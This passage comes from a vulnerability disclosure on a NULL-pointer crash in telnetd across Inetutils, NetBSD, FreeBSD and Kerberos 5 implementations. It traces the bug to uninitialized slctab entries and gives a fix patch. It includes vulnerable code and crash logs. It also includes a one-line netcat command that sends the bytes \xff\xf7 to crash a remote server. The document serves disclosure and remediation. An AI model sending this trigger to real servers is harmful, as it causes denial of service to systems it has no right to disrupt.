<span style="color: #666666">324</span>                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t) (_POSIX_VDISABLE))
<span style="color: #666666">325</span>                   pty_output_byte ((<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>) ch);
<span style="color: #666666">326</span>                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">327</span>               }
...
</pre></div>

<p>We tested Inetutils under Debian and found it also vulnerable. Using the <code>inetutils-telnetd</code> package in Debian 10.4.0, telnetd will segfault when receiving <code>\xff\xf7</code> or <code>\xff\xf8</code>:</p>
<p>Under AMD64:</p>
<pre><code># uname -ap
Linux debian 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux
# dmesg | grep telnetd
[ 1217.948086] telnetd[17254]: segfault at 0 ip 0000561ae3f92311 sp 00007ffdfb57b650 error 4 in telnetd[561ae3f8b000+15000]
</code></pre>
<p>Under i386:</p>
<pre><code># uname -ap
Linux debian 5.10.0-16-686 #1 SMP Debian 5.10.127-1 (2022-06-30) i686 GNU/Linux
# dmesg | grep telnetd
[ 1432.883806] telnetd[16847]: segfault at 0 ip 004fa8e4 sp bfbb8290 error 4 in telnetd[4f3000+15000]
</code></pre>
<p><a id="remote-dos-netbsd-telnetd"></a></p>
<h3>NetBSD-telnetd</h3>
<p>We tested the telnetd server in NetBSD and found it also vulnerable. The code is available at <a href="http://ftp.netbsd.org/pub/NetBSD/NetBSD-current/src/libexec/telnetd/state.c">http://ftp.netbsd.org/pub/NetBSD/NetBSD-current/src/libexec/telnetd/state.c</a>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">85</span> <span style="color: #B00040">void</span>
 <span style="color: #666666">86</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
 <span style="color: #666666">87</span> {
 <span style="color: #666666">88</span>         <span style="color: #B00040">int</span> c;
 <span style="color: #666666">89</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
 <span style="color: #666666">90</span> 
 <span style="color: #666666">91</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
 <span style="color: #666666">92</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
 <span style="color: #666666">93</span>                         <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">94</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
...
<span style="color: #666666">109</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
<span style="color: #666666">110</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
<span style="color: #666666">111</span>                                 state <span style="color: #666666">=</span> TS_IAC;
<span style="color: #666666">112</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">113</span>                         }
...
<span style="color: #666666">153</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
<span style="color: #666666">154</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
...
<span style="color: #666666">206</span>                         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">207                          * Erase Character and</span>
<span style="color: #408080; font-style: italic">208                          * Erase Line</span>
<span style="color: #408080; font-style: italic">209                          */</span>
<span style="color: #666666">210</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">211</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">212</span>                             {
<span style="color: #666666">213</span>                                 cc_t ch;
<span style="color: #666666">214</span> 
<span style="color: #666666">215</span>                                 DIAG(TD_OPTIONS,
<span style="color: #666666">216</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">217</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">218</span>                                 init_termbuf();
<span style="color: #666666">219</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">220</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">221</span>                                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">222</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">223</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">224</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">225</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">226</span>                             }
</pre></div>

<p>While testing NetBSD 9.3/amd64, telnetd will segfault, as usual in the <code>telrcv</code> function:</p>
<pre><code># uname -ap
NetBSD netbsd 9.3 NetBSD 9.3 (GENERIC) #0: Thu Aug  4 15:30:37 UTC 2022  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64 x86_64
# ps -auxww|grep telnet
root    882  0.0  0.0 50312  4068 ?     S     4:15PM 0:00.02 telnetd -a valid
root    755  0.0  0.0 21652  1324 pts/1 O+    4:15PM 0:00.00 grep telnet
# gdb -p 882
GNU gdb (GDB) 8.3
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
...
[Switching to LWP 1 of process 882]
0x0000768c9d242c6a in read () from /usr/lib/libc.so.12
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x000000012fe06f4c in telrcv ()
(gdb) q
A debugging session is active.

        Inferior 1 [process 882] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/libexec/telnetd, process 882
[Inferior 1 (process 882) detached]
</code></pre>
<p><a id="remote-dos-kerberos-telnetd-latest-version"></a></p>
<h3>Telnetd in Kerberos Version 5 Applications - latest version</h3>
<p>Using the master branch of <a href="https://github.com/krb5/krb5-appl">https://github.com/krb5/krb5-appl</a>, with a 13-year old <code>state.c</code> file, we can confirm the vulnerabilities are also present:</p>
<pre><code>Program received signal SIGSEGV, Segmentation fault.
0x000055555555c1bd in telrcv () at state.c:237
237      ch = *slctab[SLC_EC].sptr;
(gdb) bt
#0  0x000055555555c1bd in telrcv () at state.c:237
#1  0x000055555555d54d in ttsuck () at utility.c:153
#2  0x0000555555559fc3 in getterminaltype (name=0x7fffffffdc80 "") at telnetd.c:727
#3  doit (who=who@entry=0x7fffffffe2e0) at telnetd.c:1025
#4  0x0000555555558e82 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at telnetd.c:644
</code></pre>
<p>The vulnerable part in <code>state.c</code> has not been changed since the initial commit but we would like to confirm that the vulnerabilities existed for 30 years.</p>
<p>In the next section, we will analyze the initial commit:</p>
<p><a id="remote-dos-kerberos-telnetd-initial-version"></a></p>
<h3>Telnetd in Kerberos Version 5 Applications - initial version</h3>
<p>The code of Telnetd in Kerberos Version 5 Applications is vulnerable in the initial version. The first commit from 1991 was vulnerable as shown below.</p>
<p>This is likely the source of these 2 vulnerabilities that have been then copied into several forks over the years.</p>
<p><a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd/state.c#L218">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd/state.c#L218</a>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">79</span>         <span style="color: #B00040">void</span>
 <span style="color: #666666">80</span> <span style="color: #0000FF">telrcv</span>()
 <span style="color: #666666">81</span> {
 <span style="color: #666666">82</span>         <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
 <span style="color: #666666">83</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
 <span style="color: #666666">84</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span>     defined(CRAY2) <span style="color: #666666">&amp;&amp;</span> defined(UNICOS5)
 <span style="color: #666666">85</span>         <span style="color: #B00040">char</span> <span style="color: #666666">*</span>opfrontp <span style="color: #666666">=</span> pfrontp;
 <span style="color: #666666">86</span> <span style="border: 1px solid #FF0000">#</span>endif
 <span style="color: #666666">87</span> 
 <span style="color: #666666">88</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
 <span style="color: #666666">89</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
 <span style="color: #666666">90</span>                         <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">91</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
...
 <span style="color: #666666">96</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
...
<span style="color: #666666">106</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
<span style="color: #666666">107</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
<span style="color: #666666">108</span>                                 state <span style="color: #666666">=</span> TS_IAC;
<span style="color: #666666">109</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">110</span>                         }
...
<span style="color: #666666">150</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
<span style="color: #666666">151</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
...
<span style="color: #666666">204</span>                         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">205                          * Erase Character and</span>
<span style="color: #408080; font-style: italic">206                          * Erase Line</span>
<span style="color: #408080; font-style: italic">207                          */</span>
<span style="color: #666666">208</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">209</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">210</span>                             {
<span style="color: #666666">211</span>                                 cc_t ch;
<span style="color: #666666">212</span> 
<span style="color: #666666">213</span>                                 DIAG(TD_OPTIONS,
<span style="color: #666666">214</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">215</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">216</span>                                 init_termbuf();
<span style="color: #666666">217</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">218</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">219</span>                                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">220</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">221</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">222</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">223</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">224</span>                             }
</pre></div>

<p>From the <code>README</code> file available at
<a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README</a>, this solution is not really recent.</p>
<p>The date included in the <code>README</code> file is February 22, 1991 but the <code>krb5-appl/telnet/telnetd/state.c</code> file indicates <code>@(#)state.c     5.12 (Berkeley) 1/19/93</code>.</p>
<p>The supported Operating Systems listed in the <code>README</code> file are also very old:</p>
<pre><code>This is a distribution of both client and server telnet.  These programs
have been compiled on:
                        telnet  telnetd 
        BSD 4.3 Reno      X       X
        UNICOS 5.1        X       X
        UNICOS 6.0        X       X
        UNICOS 6.1        X       X
        UNICOS 7.0        X       X
        SunOs 3.5         X       X (no linemode in server) 
        SunOs 4.1         X       X (no linemode in server) 
        DYNIX V3.0.17.9   X       X (no linemode in server) 
        Ultrix 3.1        X       X (no linemode in server) 
        Ultrix 4.0        X       X (no linemode in server)

In addition, previous versions have been compiled on the following
machines, but were not available for testing this version.
                        telnet  telnetd 
        Next1.0           X       X
        UNICOS 5.0        X       X
        SunOs 4.0.3c      X       X (no linemode in server) 
        BSD 4.3           X       X (no linemode in server) 
        DYNIX V3.0.12     X       X (no linemode in server)
</code></pre>
<p>Back to FreeBSD to compile and test this initial version of Telnetd in Kerberos Version 5 Applications.</p>
<p>On a side note, it was confirmed the <code>telnetd</code> server shipped in FreeBSD 3.2 is vulnerable to the same vulnerabilities, as shown below:</p>
<pre><code>myname# uname -ap
FreeBSD myname.my.domain 3.2-RELEASE FreeBSD 3.2-RELEASE #0: Tue May 18 04:05:08 GMT 1999     jkh@cathair:/usr/src/sys/compile/GENERIC  i386
myname# dmesg | grep telnet
pid 291 (telnetd), uid 0: exited on signal 11 (core dumped) 
pid 297 (telnetd), uid 0: exited on signal 11 (core dumped) 
pid 303 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 319 (telnetd), uid 0: exited on signal 11 (core dumped)
</code></pre>
<p><br>
We succesfully compiled <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd</a> in FreeBSD 3.2.</p>
<p>Here is the <code>diff</code> to compile the initial version of the Telnetd in Kerberos Version 5 Applications, from the branch <code>f8420ba3e6</code> (<code>initial version</code>) under FreeBSD 3.2 (the preprocessor variables <code>-DAUTHENTICATION</code> and <code>-DENCRYPTION</code> have been removed but the vulnerable code path is still reachable):</p>
<pre><code>myname# diff -r krb5-appl krb5-appl.patched
diff -r krb5-appl/telnet/telnetd/Makefile.4.4 krb5-appl.patched/telnet/telnetd/Makefile.4.4
24c24
&lt; CFLAGS+=-DAUTHENTICATION -DENCRYPTION -I${.CURDIR}/../../lib
---
&gt; CFLAGS+=-I${.CURDIR}/../../lib
diff -r krb5-appl/telnet/telnetd/telnetd.c krb5-appl.patched/telnet/telnetd/telnetd.c
1005c1005
&lt;           char *getstr();
---
&gt;           char *Getstr();
1008,1010c1008,1010
&lt;           HE = getstr("he", &amp;cp);
&lt;           HN = getstr("hn", &amp;cp);
&lt;           IM = getstr("im", &amp;cp);
---
&gt;           HE = Getstr("he", &amp;cp);
&gt;           HN = Getstr("hn", &amp;cp);
&gt;           IM = Getstr("im", &amp;cp);
diff -r krb5-appl/telnet/telnetd/telnetd.h krb5-appl.patched/telnet/telnetd/telnetd.h
49a50,52
&gt; #define TELOPT_ENVIRON 36
&gt; #define ENV_VALUE 0
&gt; #define ENV_VAR 1
myname#
</code></pre>
<p>Compiling and installing this telnetd program:</p>
<pre><code>myname# make -f Makefile.4.4
Warning: Object directory not changed from original /usr/home/test/krb5-appl.patched/telnet/telnetd
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c authenc.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c global.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c slc.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c state.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c sys_term.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c telnetd.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c termstat.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c utility.c
cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib    -o telnetd authenc.o global.o slc.o state.o sys_term.o telnetd.o termstat.o utility.o  -lutil -ltermcap -ltelnet -lkrb -ldes
gzip -cn telnetd.0 &gt; telnetd.0.gz
myname# cp telnetd /usr/libexec/telnetd &amp;&amp; chmod 555 /usr/libexec/telnetd
</code></pre>
<p>And we can confirm this version is vulnerable.</p>
<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.201 23
(UNKNOWN) [192.168.1.201] 23 (telnet) open
&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;&lt;C3&gt;&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;&lt;C3&gt;&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;
kali%
</code></pre>
<p>Using <code>dmesg</code>, we can see the crashes of telnetd on the remote FreeBSD 3.2 server:</p>
<pre><code>myname# dmesg | grep telnet
pid 497 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 499 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 500 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 501 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 502 (telnetd), uid 0: exited on signal 11 (core dumped)
pid 503 (telnetd), uid 0: exited on signal 11 (core dumped)
</code></pre>
<p>We also provide a working patch for Telnetd, Kerberos Version 5 Applications - <code>initial version</code>. This patch has been tested with FreeBSD 3.2/i386.</p>
<p>Please note that we suggest not to use FreeBSD 3.2 or the 30-year old version of the Kerberos Version 5 Applications.</p>
<pre><code>myname# diff -u -p krb5-appl/telnet/telnetd/state.c krb5-appl.patched/telnet/telnetd/state.c
--- krb5-appl/telnet/telnetd/state.c        Sun Aug 21 09:00:34 2022
+++ krb5-appl.patched/telnet/telnetd/state.c        Mon Aug 21 09:02:56 2022
@@ -208,16 +208,22 @@ gotiac:                       switch (c) {
                    case EC:
                    case EL:
                        {
-                           cc_t ch;
+                           cc_t ch = (cc_t)_POSIX_VDISABLE;

                            DIAG(TD_OPTIONS,
                                    printoption("td: recv IAC", c));
                            ptyflush();     /* half-hearted */
                            init_termbuf();
                            if (c == EC)
-                                   ch = *slctab[SLC_EC].sptr;
+                           {
+                                   if (slctab[SLC_EC].sptr)
+                                           ch = *slctab[SLC_EC].sptr;
+                           }
                            else
-                                   ch = *slctab[SLC_EL].sptr;
+                           {
+                                   if (slctab[SLC_EL].sptr)
+                                           ch = *slctab[SLC_EL].sptr;
+                           }
                            if (ch != (cc_t)(_POSIX_VDISABLE))
                                    *pfrontp++ = (unsigned char)ch;
                            break;
</code></pre>
<p><a id="remote-dos-analysis"></a></p>
<h3>Analysis of the "normal" execution path</h3>
<p>In this section, we used the sources found in FreeBSD 13.1 but the root cause is similar with any previously listed <code>telnetd</code>.</p>
<p>When reviewing the code, the "normal" execution flow to correctly initialize the <code>slctab[31]</code> array is:</p>
<pre><code>main() -&gt; doit() -&gt; telnet() -&gt; get_slc_defaults()
</code></pre>
<p>In the <code>telnet()</code> function, there is a call to <code>get_slc_defaults()</code> on line 747:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">723</span> <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">724  * Main loop.  Select from pty and network, and</span>
<span style="color: #408080; font-style: italic">725  * hand data to telnet receiver finite state machine.</span>
<span style="color: #408080; font-style: italic">726  */</span>
<span style="color: #666666">727</span> <span style="color: #B00040">void</span>
<span style="color: #666666">728</span> telnet(<span style="color: #B00040">int</span> f, <span style="color: #B00040">int</span> p, <span style="color: #B00040">char</span> <span style="color: #666666">*</span>host)
<span style="color: #666666">729</span> {
...
<span style="color: #666666">743</span>
<span style="color: #666666">744</span>         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">745          * Initialize the slc mapping table.</span>
<span style="color: #408080; font-style: italic">746          */</span>
<span style="color: #666666">747</span>         get_slc_defaults();
...
<span style="color: #666666">797</span>         <span style="color: #008000; font-weight: bold">while</span> (his_will_wont_is_changing(TELOPT_NAWS))
<span style="color: #666666">798</span>                 ttloop();
...
<span style="color: #666666">811</span>         <span style="color: #008000; font-weight: bold">if</span> (his_want_state_is_will(TELOPT_ECHO) <span style="color: #666666">&amp;&amp;</span>
<span style="color: #666666">812</span>             his_state_is_will(TELOPT_NAWS)) {
<span style="color: #666666">813</span>                 <span style="color: #008000; font-weight: bold">while</span> (his_will_wont_is_changing(TELOPT_ECHO))
<span style="color: #666666">814</span>                         ttloop();
</pre></div>

<p>After <code>get_slc_defaults()</code>, there are multiple calls to the <code>ttloop()</code> function (lines 798 and 814). This is the normal behavior.</p>
<p>The function <code>get_slc_defaults()</code> defined in <code>slc.c</code> is used to correctly initialize the <code>slctab[31]</code> array.</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">99</span> <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">100  * get_slc_defaults</span>
<span style="color: #408080; font-style: italic">101  *</span>
<span style="color: #408080; font-style: italic">102  * Initialize the slc mapping table.</span>
<span style="color: #408080; font-style: italic">103  */</span>
<span style="color: #666666">104</span> <span style="color: #B00040">void</span>
<span style="color: #666666">105</span> get_slc_defaults(<span style="color: #B00040">void</span>)
<span style="color: #666666">106</span> {
<span style="color: #666666">107</span>         <span style="color: #B00040">int</span> i;
<span style="color: #666666">108</span> 
<span style="color: #666666">109</span>         <span style="color: #0000FF">init_termbuf</span>();
<span style="color: #666666">110</span> 
<span style="color: #666666">111</span>         <span style="color: #008000; font-weight: bold">for</span> (i <span style="color: #666666">=</span> <span style="color: #666666">1</span>; i <span style="color: #666666">&lt;=</span> NSLC; i<span style="color: #666666">++</span>) {
<span style="color: #666666">112</span>                 slctab[i].defset.flag <span style="color: #666666">=</span>
<span style="color: #666666">113</span>                         spcset(i, <span style="color: #666666">&amp;</span>slctab[i].defset.val, <span style="color: #666666">&amp;</span>slctab[i].sptr);
<span style="color: #666666">114</span>                 slctab[i].current.flag <span style="color: #666666">=</span> SLC_NOSUPPORT;
<span style="color: #666666">115</span>                 slctab[i].current.val <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
<span style="color: #666666">116</span>         }
<span style="color: #666666">117</span> 
<span style="color: #666666">118</span> }  <span style="color: #408080; font-style: italic">/* end of get_slc_defaults */</span>
</pre></div>

<p>Interestingly, the initialization starts from 1.</p>
<p><code>NSLC</code> is defined in <code>../arpa/telnet.h</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>    <span style="color: #666666">216</span> <span style="border: 1px solid #FF0000">#</span>define NSLC            <span style="color: #666666">30</span>
</pre></div>

<p>You can review the <code>spcset()</code> <a href="https://github.com/freebsd/freebsd-src/blob/main/contrib/telnet/telnetd/sys_term.c#L285">function here</a>.</p>
<p>The <code>slctab</code> global variable, an array of 31 <code>slcfun</code> structures, is defined in the <code>ext.h</code> file:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>     <span style="color: #666666">63</span> EXTERN slcfun   slctab[NSLC <span style="color: #666666">+</span> <span style="color: #666666">1</span>];       <span style="color: #408080; font-style: italic">/* slc mapping table */</span>
</pre></div>

<p>And the <code>slcfun</code> structure is defined in the <code>defs.h</code> file:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">99</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">!</span>defined(USE_TERMIO) <span style="color: #666666">||</span> defined(NO_CC_T)
<span style="color: #666666">100</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span> cc_t;
<span style="color: #666666">101</span> <span style="border: 1px solid #FF0000">#</span>endif
...
<span style="color: #666666">152</span> <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">153  * Structures of information for each special character function.</span>
<span style="color: #408080; font-style: italic">154  */</span>
<span style="color: #666666">155</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #008000; font-weight: bold">struct</span> {
<span style="color: #666666">156</span>         <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>   flag;           <span style="color: #408080; font-style: italic">/* the flags for this function */</span>
<span style="color: #666666">157</span>         cc_t            val;            <span style="color: #408080; font-style: italic">/* the value of the special character */</span>
<span style="color: #666666">158</span> } slcent, <span style="color: #666666">*</span>Slcent;
<span style="color: #666666">159</span>
<span style="color: #666666">160</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #008000; font-weight: bold">struct</span> {
<span style="color: #666666">161</span>         slcent          defset;         <span style="color: #408080; font-style: italic">/* the default settings */</span>
<span style="color: #666666">162</span>         slcent          current;        <span style="color: #408080; font-style: italic">/* the current settings */</span>
<span style="color: #666666">163</span>         cc_t            <span style="color: #666666">*</span>sptr;          <span style="color: #408080; font-style: italic">/* a pointer to the char in */</span>
<span style="color: #666666">164</span>                                         <span style="color: #408080; font-style: italic">/* system data structures */</span>
<span style="color: #666666">165</span> } slcfun, <span style="color: #666666">*</span>Slcfun;
</pre></div>

<p>Because <code>slctab</code> is a global variable, all its fields are initialized to <code>0</code> by default.</p>
<p>Using <code>readelf</code>, we can confirm <code>slctab</code> is a global variable:</p>
<pre><code>root@freebsd-13-1p1:~ # readelf -a /usr/libexec/telnetd
Symbol table (.symtab) contains 616 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
...
   187: 0000000000022730   496 OBJECT  GLOBAL DEFAULT   27 slctab
</code></pre>
<p><a id="remote-dos-root-cause-analysis"></a></p>
<h2>Root cause analysis of the crashes</h2>
<p>When reviewing the code, the execution flow leading to segfaults is:</p>
<pre><code>main() -&gt; doit() -&gt; getterminaltype() -&gt; ttloop() -&gt; telrcv() -&gt; Access to *(slctab[10].sptr) or *(slctab[11].sptr).
</code></pre>
<p>In the <code>doit()</code> function, there is a call to <code>getterminaltype()</code> on line 715 and then to <code>telnet()</code> on line 718:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>    <span style="color: #666666">652</span> <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">    653  * Get a pty, scan input lines.</span>
<span style="color: #408080; font-style: italic">    654  */</span>
    <span style="color: #666666">655</span> <span style="color: #B00040">void</span>
    <span style="color: #666666">656</span> doit(<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>who)
    <span style="color: #666666">657</span> {
...
    <span style="color: #666666">715</span>         level <span style="color: #666666">=</span> getterminaltype(user_name);
...
    <span style="color: #666666">718</span>         telnet(net, pty, remote_hostname);      <span style="color: #408080; font-style: italic">/* begin server process */</span>
</pre></div>

<p>Analyzing <code>getterminaltype()</code> reveals that there are multiple calls to the <code>ttloop()</code> function (on line 481 when compiled with <code>-DAUTHENTICATION</code> and on line 505 by default):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">468</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span>
<span style="color: #666666">469</span> <span style="color: #0000FF">getterminaltype</span>(<span style="color: #B00040">char</span> <span style="color: #666666">*</span>name undef2)
<span style="color: #666666">470</span> {
...
<span style="color: #666666">474</span> <span style="border: 1px solid #FF0000">#</span>ifdef  AUTHENTICATION
...
<span style="color: #666666">481</span>             ttloop();
...
<span style="color: #666666">486</span> <span style="border: 1px solid #FF0000">#</span>endif
...
<span style="color: #666666">496</span>     <span style="color: #008000; font-weight: bold">while</span> (
